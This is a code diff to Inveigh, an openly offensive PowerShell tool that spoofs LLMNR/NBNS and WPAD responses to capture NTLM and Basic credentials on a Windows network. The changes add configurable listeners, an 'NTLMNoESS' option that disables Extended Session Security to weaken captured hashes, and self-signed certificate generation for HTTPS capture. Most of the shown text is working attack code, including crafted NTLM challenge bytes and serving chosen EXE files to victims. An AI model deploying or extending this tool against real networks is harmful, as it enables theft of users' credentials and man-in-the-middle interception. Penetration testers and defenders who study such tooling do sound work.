@@ -41,11 +41,11 @@ LLMNR/NBNS requests for any received LLMNR/NBNS requests. If a response is recei
 hostname to a spoofing blacklist.
 
 .PARAMETER SpooferLearningDelay
-(Interger) Time in minutes that Inveigh will delay spoofing while valid hosts are being blacklisted through
+(Integer) Time in minutes that Inveigh will delay spoofing while valid hosts are being blacklisted through
 SpooferLearning.
 
 .PARAMETER SpooferLearningInterval
-Default = 30 Minutes: (Interger) Time in minutes that Inveigh wait before sending out an LLMNR/NBNS request for a
+Default = 30 Minutes: (Integer) Time in minutes that Inveigh wait before sending out an LLMNR/NBNS request for a
 hostname that has already been checked if SpooferLearning is enabled.   
 
 .PARAMETER SpooferRepeat
@@ -71,17 +71,15 @@ Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Serv
 .PARAMETER HTTP
 Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.
 
-.PARAMETER HTTPS
-Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
-the local store and attached to port 443. If the script does not exit gracefully, execute 
-"netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal"
-in the cert store.
+.PARAMETER HTTPIP
+Default = Any: IP address for the HTTP/HTTPS listener.
+
+.PARAMETER HTTPPort
+Default = 80: TCP port for the HTTP listener.
 
 .PARAMETER HTTPAuth
-Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type. This setting does not apply to
-wpad.dat requests. Note that Microsoft has changed the behavior of WDAP through NBNS in the June 2016 patches. A 
-WPAD enabled browser may now trigger NTLM authentication after sending out NBNS requests to random hostnames and
-connecting to the root of the web server.
+Default = NTLM: (Anonymous,Basic,NTLM,NTLMNoESS) HTTP/HTTPS server authentication type. This setting does not apply to
+wpad.dat requests. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation. 
 
 .PARAMETER HTTPBasicRealm
 Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.
@@ -100,16 +98,26 @@ EXE filename within the HTTPDir to serve as the default HTTP/HTTPS response for 
 String or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat requests.
 This parameter will not be used if HTTPDir is set. Use PowerShell character escapes where necessary. 
 
-.PARAMETER HTTPSCertAppID
-Valid application GUID for use with the ceriticate.
+.PARAMETER HTTPS
+Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
+the local store and attached to port specified IP and port. If the script does not exit gracefully, execute 
+"netsh http delete sslcert ipport=" with the correct IP and port and manually remove the certificate.
 
-.PARAMETER HTTPSCertThumbprint
-Certificate thumbprint for use with a custom certificate. The certificate filename must be located in the current
-working directory and named Inveigh.pfx.
+.PARAMETER HTTPSPort
+Default = 443: TCP port for the HTTPS listener.
+
+.PARAMETER HTTPSCertIssuer
+Default = Inveigh: The issuer field for the cert that will be installed for HTTPS.
+
+.PARAMETER HTTPSCertSubject
+Default = localhost: The subject field for the cert that will be installed for HTTPS.
+
+.PARAMETER HTTPSForceCertDelete
+Default = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and HTTPSCertSubject.
 
 .PARAMETER WPADAuth
-Default = NTLM: (Anonymous,Basic,NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
-Anonymous can prevent browser login prompts.
+Default = NTLM: (Anonymous,Basic,NTLM,NTLMNoESS) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
+Anonymous can prevent browser login prompts. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation.
 
 .PARAMETER WPADEmptyFile
 Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests.
@@ -178,6 +186,9 @@ also be enabled.
 .PARAMETER RunTime
 (Integer) Run time duration in minutes.
 
+.PARAMETER StartupChecks
+Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.
+
 .PARAMETER ShowHelp
 Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
 
@@ -240,6 +251,7 @@ param
 ( 
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SMB = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LLMNR = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS = "N",
@@ -254,11 +266,13 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WPADEmptyFile = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
-    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$HTTPAuth = "NTLM",
-    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM")][String]$WPADAuth = "NTLM",
+    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$HTTPAuth = "NTLM",
+    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$WPADAuth = "NTLM",
     [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$NBNSTypes = @("00","20"),
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP = "",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP = "",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDir = "",
@@ -269,6 +283,8 @@ param
     [parameter(Mandatory=$false)][Array]$SpooferIPsReply = "",
     [parameter(Mandatory=$false)][Array]$SpooferIPsIgnore = "",
     [parameter(Mandatory=$false)][Array]$WPADDirectHosts = "",
+    [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
+    [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
     [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
     [parameter(Mandatory=$false)][Int]$LLMNRTTL = "30",
     [parameter(Mandatory=$false)][Int]$NBNSTTL = "165",
@@ -280,8 +296,8 @@ param
     [parameter(Mandatory=$false)][String]$HTTPDefaultFile = "",
     [parameter(Mandatory=$false)][String]$HTTPDefaultEXE = "",
     [parameter(Mandatory=$false)][String]$HTTPResponse = "",
-    [parameter(Mandatory=$false)][String]$HTTPSCertAppID = "00112233-4455-6677-8899-AABBCCDDEEFF",
-    [parameter(Mandatory=$false)][String]$HTTPSCertThumbprint = "98c1d54840c5c12ced710758b6ee56cc62fa1f0d",
+    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "Inveigh",
+    [parameter(Mandatory=$false)][String]$HTTPSCertSubject = "localhost",
     [parameter(Mandatory=$false)][String]$WPADResponse = "",
     [parameter(Mandatory=$false)][Switch]$Inspect,
     [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
@@ -289,7 +305,8 @@ param
 
 if ($invalid_parameter)
 {
-    throw "$($invalid_parameter) is not a valid parameter."
+    Write-Output "Error:$($invalid_parameter) is not a valid parameter"
+    throw
 }
 
 if(!$IP)
@@ -307,7 +324,8 @@ if($HTTPDefaultFile -or $HTTPDefaultEXE)
 
     if(!$HTTPDir)
     {
-        throw "You must specify an -HTTPDir when using either -HTTPDefaultFile or -HTTPDefaultEXE"
+        Write-Output "Error:You must specify an -HTTPDir when using either -HTTPDefaultFile or -HTTPDefaultEXE"
+        throw
     }
 
 }
@@ -317,12 +335,14 @@ if($WPADIP -or $WPADPort)
 
     if(!$WPADIP)
     {
-        throw "You must specify a -WPADPort to go with -WPADIP"
+        Write-Output "Error:You must specify a -WPADPort to go with -WPADIP"
+        throw
     }
 
     if(!$WPADPort)
     {
-        throw "You must specify a -WPADIP to go with -WPADPort"
+        Write-Output "Error:You must specify a -WPADIP to go with -WPADPort"
+        throw
     }
 
 }
@@ -352,7 +372,8 @@ if(!$inveigh)
 
 if($inveigh.running)
 {
-    throw "Invoke-Inveigh is already running, use Stop-Inveigh"
+    Write-Output "Error:Invoke-Inveigh is already running, use Stop-Inveigh"
+    throw
 }
 
 $inveigh.sniffer_socket = $null
@@ -372,11 +393,11 @@ if(!$inveigh.relay_running -or !$inveigh.unprivileged_running)
     $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
     $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
     $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
-    $inveigh.certificate_application_ID = $HTTPSCertAppID
-    $inveigh.certificate_thumbprint = $HTTPSCertThumbprint
     $inveigh.console_output = $false
     $inveigh.console_input = $true
     $inveigh.file_output = $false
+    $inveigh.HTTPS_existing_certificate = $false
+    $inveigh.HTTPS_force_certificate_delete = $false
     $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
     $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
     $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
@@ -438,11 +459,22 @@ else
 $inveigh.status_queue.Add("Inveigh started at $(Get-Date -format 's')")  > $null
 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh started")]) > $null
 
-$firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
+if($StartupChecks -eq 'Y')
+{
+    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
+}
 
 if($firewall_status)
 {
     $inveigh.status_queue.Add("Windows Firewall = Enabled")  > $null
+    $firewall_rules = New-Object -comObject HNetCfg.FwPolicy2
+    $firewall_powershell = $firewall_rules.rules | Where-Object {$_.Enabled -eq $true -and $_.Direction -eq 1} |Select-Object -Property Name | Select-String "Windows PowerShell}"
+
+    if($firewall_powershell)
+    {
+        $inveigh.status_queue.Add("Windows Firewall - PowerShell.exe = Allowed")  > $null
+    }
+
 }
 
 $inveigh.status_queue.Add("Listening IP Address = $IP")  > $null
@@ -551,16 +583,31 @@ else
 
 if($HTTP -eq 'Y')
 {
-
-    $HTTP_port_check = netstat -anp TCP | findstr 0.0.0.0:80
+    
+    if($StartupChecks -eq 'Y')
+    {
+        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
+    }
 
     if($HTTP_port_check)
     {
+        $HTTP = "N"
         $inveigh.HTTP = $false
-        $inveigh.status_queue.Add("HTTP Capture Disabled Due To In Use Port 80")  > $null
+        $inveigh.status_queue.Add("HTTP Capture Disabled Due To In Use Port $HTTPPort")  > $null
     }
     else
     {
+
+        if($HTTPIP -ne '0.0.0.0')
+        {
+            $inveigh.status_queue.Add("HTTP IP = $HTTPIP") > $null
+        }
+
+        if($HTTPPort -ne 80)
+        {
+            $inveigh.status_queue.Add("HTTP Port = $HTTPPort") > $null
+        }
+
         $inveigh.HTTP = $true
         $inveigh.status_queue.Add("HTTP Capture = Enabled")  > $null
     }
@@ -574,38 +621,106 @@ else
 
 if($HTTPS -eq 'Y')
 {
-
-    $HTTPS_port_check = netstat -anp TCP | findstr 0.0.0.0:443
+    
+    if($StartupChecks -eq 'Y')
+    {
+        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPSPort "
+    }
 
     if($HTTPS_port_check)
     {
-        $inveigh.HTTP = $true
-        $inveigh.status_queue.Add("HTTPS Capture Disabled Due To In Use Port 443")  > $null
+        $HTTPS = "N"
+        $inveigh.HTTPS = $false
+        $inveigh.status_queue.Add("HTTPS Capture Disabled Due To In Use Port $HTTPSPort")  > $null
     }
     else
     {
 
         try
-        {
-            $inveigh.HTTPS = $true
-            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
-            $certificate_store.Open('ReadWrite')
-            $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
-            $certificate.Import($PWD.Path + "\Inveigh.pfx")
-            $certificate_store.Add($certificate) 
-            $certificate_store.Close()
-            $netsh_certhash = "certhash=" + $inveigh.certificate_thumbprint
-            $netsh_app_ID = "appid={" + $inveigh.certificate_application_ID + "}"
-            $netsh_arguments = @("http","add","sslcert","ipport=0.0.0.0:443",$netsh_certhash,$netsh_app_ID)
+        { 
+            $inveigh.certificate_issuer = $HTTPSCertIssuer
+            $inveigh.certificate_CN = $HTTPSCertSubject
+            $inveigh.status_queue.Add("HTTPS Certificate Issuer = " + $inveigh.certificate_issuer)  > $null
+            $inveigh.status_queue.Add("HTTPS Certificate CN = " + $inveigh.certificate_CN)  > $null
+            $certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})
+
+            if(!$certificate_check)
+            {
+                # credit to subTee for cert creation code https://github.com/subTee/Interceptor
+                $certificate_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
+                $certificate_distinguished_name.Encode( "CN=" + $inveigh.certificate_CN, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
+                $certificate_issuer_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
+                $certificate_issuer_distinguished_name.Encode("CN=" + $inveigh.certificate_issuer, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
+                $certificate_key = new-object -com "X509Enrollment.CX509PrivateKey"
+                $certificate_key.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
+                $certificate_key.KeySpec = 2
+                $certificate_key.Length = 2048
+			    $certificate_key.MachineContext = 1
+                $certificate_key.Create()
+                $certificate_server_auth_OID = new-object -com "X509Enrollment.CObjectId"
+			    $certificate_server_auth_OID.InitializeFromValue("1.3.6.1.5.5.7.3.1")
+			    $certificate_enhanced_key_usage_OID = new-object -com "X509Enrollment.CObjectIds.1"
+			    $certificate_enhanced_key_usage_OID.add($certificate_server_auth_OID)
+			    $certificate_enhanced_key_usage_extension = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
+			    $certificate_enhanced_key_usage_extension.InitializeEncode($certificate_enhanced_key_usage_OID)
+			    $certificate = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
+			    $certificate.InitializeFromPrivateKey(2,$certificate_key,"")
+			    $certificate.Subject = $certificate_distinguished_name
+			    $certificate.Issuer = $certificate_issuer_distinguished_name
+			    $certificate.NotBefore = (get-date).AddDays(-271)
+			    $certificate.NotAfter = $certificate.NotBefore.AddDays(824)
+			    $certificate_hash_algorithm_OID = New-Object -ComObject X509Enrollment.CObjectId
+			    $certificate_hash_algorithm_OID.InitializeFromAlgorithmName(1,0,0,"SHA256")
+			    $certificate.HashAlgorithm = $certificate_hash_algorithm_OID
+                $certificate.X509Extensions.Add($certificate_enhanced_key_usage_extension)
+                $certificate_basic_constraints = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
+			    $certificate_basic_constraints.InitializeEncode("true",1)
+                $certificate.X509Extensions.Add($certificate_basic_constraints)
+                $certificate.Encode()
+                $certificate_enrollment = new-object -com "X509Enrollment.CX509Enrollment"
+			    $certificate_enrollment.InitializeFromRequest($certificate)
+			    $certificate_data = $certificate_enrollment.CreateRequest(0)
+                $certificate_enrollment.InstallResponse(2,$certificate_data,0,"")
+            }
+            else
+            {
+                
+                if($HTTPSForceCertDelete -eq 'Y')
+                {
+                    $inveigh.HTTPS_force_certificate_delete = $true
+                }
+
+                $inveigh.HTTPS_existing_certificate = $true
+                $inveigh.status_queue.Add("HTTPS Capture = Using Existing Certificate")  > $null
+            }
+            
+            $certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})
+            $netsh_certhash = "certhash=" + $certificate_check.thumbprint
+            $netsh_app_ID = "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
+            $netsh_arguments = @("http","add","sslcert","ipport=$HTTPIP`:$HTTPSPort",$netsh_certhash,$netsh_app_ID)
             & "netsh" $netsh_arguments > $null
+            $inveigh.HTTPS = $true
+            $inveigh.HTTPS_IP = $HTTPIP
+            $inveigh.HTTPS_port = $HTTPSPort
+
+            if($HTTPIP -ne '0.0.0.0')
+            { 
+                $inveigh.status_queue.Add("HTTPS IP = $HTTPIP") > $null
+            }
+
+            if($HTTPSPort -ne 443)
+            {   
+                $inveigh.status_queue.Add("HTTPS Port = $HTTPSPort") > $null
+            }
+
             $inveigh.status_queue.Add("HTTPS Capture = Enabled")  > $null
+
         }
         catch
         {
-            $certificate_store.Close()
-            $HTTPS="N"
+            $HTTPS = "N"
             $inveigh.HTTPS = $false
-            $inveigh.status_queue.Add("HTTPS Capture Disabled Due To Certificate Install Error")  > $null
+            $inveigh.status_queue.Add("HTTPS Capture Disabled Due To Certificate Error")  > $null
         }
 
     }
@@ -616,7 +731,7 @@ else
     $inveigh.status_queue.Add("HTTPS Capture = Disabled")  > $null
 }
 
-if($inveigh.HTTP -or $inveigh.HTTPS)
+if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
 {
     $inveigh.status_queue.Add("HTTP/HTTPS Authentication = $HTTPAuth")  > $null
     $inveigh.status_queue.Add("WPAD Authentication = $WPADAuth")  > $null
@@ -1011,8 +1126,8 @@ $HTTP_scriptblock =
 
     function NTLMChallengeBase64
     {
-        param ([String]$Challenge)
-
+        param ([String]$Challenge,[Bool]$NTLMESS)
+        
         $HTTP_timestamp = Get-Date
         $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
         $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))
@@ -1033,8 +1148,18 @@ $HTTP_scriptblock =
 
         $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $HTTP_challenge)  > $null
 
+        if($NTLMESS)
+        {
+            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x89,0x0a
+        }
+        else
+        {
+            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x81,0x0a
+        }
+
         $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
-                            0x00,0x00,0x00,0x05,0x82,0x89,0xa +
+                            0x00,0x00,0x00 +
+                            $HTTP_NTLM_negotiation_flags +
                             $HTTP_challenge_bytes +
                             0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                             0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
@@ -1049,9 +1174,10 @@ $HTTP_scriptblock =
                             0x00,0x00,0x00,0x00,0x0a,0x0a
 
         $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
+        $NTLM = $null
         $NTLM = 'NTLM ' + $NTLM_challenge_base64
         $NTLM_challenge = $HTTP_challenge
-        
+
         return $NTLM
     }
 
@@ -1074,8 +1200,10 @@ $HTTP_scriptblock =
         {
             $HTTP_type = "HTTP"
         }
+
+        $HTTP_request_raw_url = $inveigh.request.RawUrl
         
-        if($inveigh.request.RawUrl -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous')
+        if($HTTP_request_raw_url -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous')
         {
             $inveigh.response.StatusCode = 200
         }
@@ -1084,10 +1212,19 @@ $HTTP_scriptblock =
             $inveigh.response.StatusCode = 401
         }
 
+        if(($HTTP_request_raw_url -match '/wpad.dat' -and $WPADAuth -eq 'NTLM') -or ($HTTP_request_raw_url -notmatch '/wpad.dat' -and $HTTPAuth -eq 'NTLM'))
+        {
+            $HTTPNTLMESS = $true
+        }
+        else
+        {
+            $HTTPNTLMESS = $false
+        }
+
         $HTTP_request_time = Get-Date -format 's'
         $HTTP_source_IP = $inveigh.request.RemoteEndpoint.Address.IPAddressToString
 
-        if($HTTP_request_time -eq $HTTP_request_time_old -and $inveigh.request.RawUrl -eq $HTTP_request_raw_url_old -and $HTTP_source_IP -eq $HTTP_request_remote_endpoint_old)
+        if($HTTP_request_time -eq $HTTP_request_time_old -and $HTTP_request_raw_url -eq $HTTP_request_raw_url_old -and $HTTP_source_IP -eq $HTTP_request_remote_endpoint_old)
         {
             $HTTP_raw_url_output = $false
         }
@@ -1098,11 +1235,11 @@ $HTTP_scriptblock =
          
         if(!$inveigh.request.headers["Authorization"] -and $inveigh.HTTP_listener.IsListening -and $HTTP_raw_url_output)
         {
-            $inveigh.console_queue.Add("$HTTP_request_time - $HTTP_type request for " + $inveigh.request.RawUrl + " received from $HTTP_source_IP")
-            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$HTTP_request_time - $HTTP_type request for " + $inveigh.request.RawUrl + " received from $HTTP_source_IP")])
+            $inveigh.console_queue.Add("$HTTP_request_time - $HTTP_type request for $HTTP_request_raw_url received from $HTTP_source_IP")
+            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$HTTP_request_time - $HTTP_type request for $HTTP_request_raw_url received from $HTTP_source_IP")])
         }
 
-        $HTTP_request_raw_url_old = $inveigh.request.RawUrl
+        $HTTP_request_raw_url_old = $HTTP_request_raw_url
         $HTTP_request_remote_endpoint_old = $HTTP_source_IP
         $HTTP_request_time_old = $HTTP_request_time
             
@@ -1117,7 +1254,7 @@ $HTTP_scriptblock =
             if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
             {   
                 $inveigh.response.StatusCode = 401
-                $NTLM = NTLMChallengeBase64 $Challenge
+                $NTLM = NTLMChallengeBase64 $Challenge $HTTPNTLMESS
             }
             elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
             {
@@ -1252,34 +1389,34 @@ $HTTP_scriptblock =
                  
         }
 
-        if(($HTTPAuth -eq 'Anonymous' -and $inveigh.request.RawUrl -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Anonymous' -and $inveigh.request.RawUrl -match '/wpad.dat') -or $NTLM_Auth -or $basic_auth)
+        if(($HTTPAuth -eq 'Anonymous' -and $HTTP_request_raw_url -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Anonymous' -and $HTTP_request_raw_url -match '/wpad.dat') -or $NTLM_Auth -or $basic_auth)
         {
 
-            if($HTTPDir -and $HTTPDefaultEXE -and $inveigh.request.RawUrl -like '*.exe' -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultEXE)) -and !(Test-Path (Join-Path $HTTPDir $inveigh.request.RawUrl)))
+            if($HTTPDir -and $HTTPDefaultEXE -and $HTTP_request_raw_url -like '*.exe' -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultEXE)) -and !(Test-Path (Join-Path $HTTPDir $HTTP_request_raw_url)))
             {
                 [Byte[]]$HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultEXE))
             }
             elseif($HTTPDir)
             {
 
-                if($HTTPDefaultFile -and !(Test-Path (Join-Path $HTTPDir $inveigh.request.RawUrl)) -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)) -and $inveigh.request.RawUrl -notmatch '/wpad.dat')
+                if($HTTPDefaultFile -and !(Test-Path (Join-Path $HTTPDir $HTTP_request_raw_url)) -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)) -and $HTTP_request_raw_url -notmatch '/wpad.dat')
                 {
                     [Byte[]]$HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
                 }
-                elseif($HTTPDefaultFile -and $inveigh.request.RawUrl -eq '/' -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)))
+                elseif($HTTPDefaultFile -and $HTTP_request_raw_url -eq '/' -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)))
                 {
                     [Byte[]]$HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
                 }
-                elseif($WPADResponse -and $inveigh.request.RawUrl -match '/wpad.dat')
+                elseif($WPADResponse -and $HTTP_request_raw_url -match '/wpad.dat')
                 {
                     [Byte[]]$HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($WPADResponse)
                 }
                 else
                 {
 
-                    if(Test-Path (Join-Path $HTTPDir $inveigh.request.RawUrl))
+                    if(Test-Path (Join-Path $HTTPDir $HTTP_request_raw_url))
                     {
-                        [Byte[]]$HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $inveigh.request.RawUrl))
+                        [Byte[]]$HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTP_request_raw_url))
                     }
                     else
                     {
@@ -1292,7 +1429,7 @@ $HTTP_scriptblock =
             else
             {
 
-                if($inveigh.request.RawUrl -match '/wpad.dat')
+                if($HTTP_request_raw_url -match '/wpad.dat')
                 {
                     $inveigh.message = $WPADResponse
                 }
@@ -1313,11 +1450,11 @@ $HTTP_scriptblock =
             [Byte[]]$HTTP_buffer = $null
         }
 
-        if(($HTTPAuth -eq 'NTLM' -and $inveigh.request.RawUrl -notmatch '/wpad.dat') -or ($WPADAuth -eq 'NTLM' -and $inveigh.request.RawUrl -match '/wpad.dat') -and !$NTLM_auth)
+        if(($HTTPAuth -like 'NTLM*' -and $HTTP_request_raw_url -notmatch '/wpad.dat') -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_url -match '/wpad.dat') -and !$NTLM_auth)
         {
             $inveigh.response.AddHeader("WWW-Authenticate",$NTLM)
         }
-        elseif(($HTTPAuth -eq 'Basic' -and $inveigh.request.RawUrl -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Basic' -and $inveigh.request.RawUrl -match '/wpad.dat'))
+        elseif(($HTTPAuth -eq 'Basic' -and $HTTP_request_raw_url -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Basic' -and $HTTP_request_raw_url -match '/wpad.dat'))
         {
             $inveigh.response.AddHeader("WWW-Authenticate","Basic realm=$HTTPBasicRealm")
         }
@@ -1775,7 +1912,7 @@ $sniffer_scriptblock =
                             if($LLMNR -eq 'Y')
                             {
 
-                                if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -contains $LLMNR_query_string -and $source_IP -ne $IP)
+                                if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $LLMNR_query_string -and $source_IP -ne $IP)
                                 {
 
                                     if(($LLMNR_learning_log.Exists({param($s) $s -like "20* $LLMNR_query_string"})))
@@ -1815,7 +1952,7 @@ $sniffer_scriptblock =
                                         $LLMNR_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
                                         $LLMNR_UDP_client.Connect($LLMNR_learning_destination_endpoint)
                                         $LLMNR_UDP_client.Send($LLMNR_request_packet,$LLMNR_request_packet.Length)
-                                        $LLMNR_UDP_client_port = ($LLMNR_UDP_client.Client.LocalEndPoint).Port
+                                        #$LLMNR_UDP_client_port = ($LLMNR_UDP_client.Client.LocalEndPoint).Port
                                         $LLMNR_UDP_client.Close()
                                         $LLMNR_learning_log.Add("$(Get-Date -format 's') $LLMNR_transaction_ID $LLMNR_query_string")
                                         $inveigh.console_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252")
@@ -1957,31 +2094,43 @@ $sniffer_scriptblock =
     
                 if($inveigh.HTTPS)
                 {
-                    & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null
-        
-                    try
+                    $certificate_check = & "netsh" http show sslcert
+
+                    if($certificate_check)
                     {
-                        $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
-                        $certificate_store.Open('ReadWrite')
-                        $certificate = $certificate_store.certificates.Find("FindByThumbprint",$inveigh.certificate_thumbprint,$false)[0]
-                        $certificate_store.Remove($certificate)
-                        $certificate_store.Close()
+                        $netsh_ipport = "ipport=" + $inveigh.HTTPS_IP + ":" + $inveigh.HTTPS_port
+                        $netsh_arguments = @("http","delete","sslcert",$netsh_ipport)
+                        & "netsh" $netsh_arguments > $null
                     }
-                    catch
+
+                    if(!$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))
                     {
 
-                        if($inveigh.status_output)
+                        try
                         {
-                            $inveigh.console_queue.Add("SSL Certificate Deletion Error - Remove Manually")
+                            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
+                            $certificate_store.Open('ReadWrite')
+                            $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})
+
+                            ForEach($certificate in $certificates)
+                            {
+                                $certificate_store.Remove($certificate)
+                            }
+
+                            $certificate_store.Close()
+                        }
+                        catch
+                        {
+                            Write-Output("SSL Certificate Deletion Error - Remove Manually")
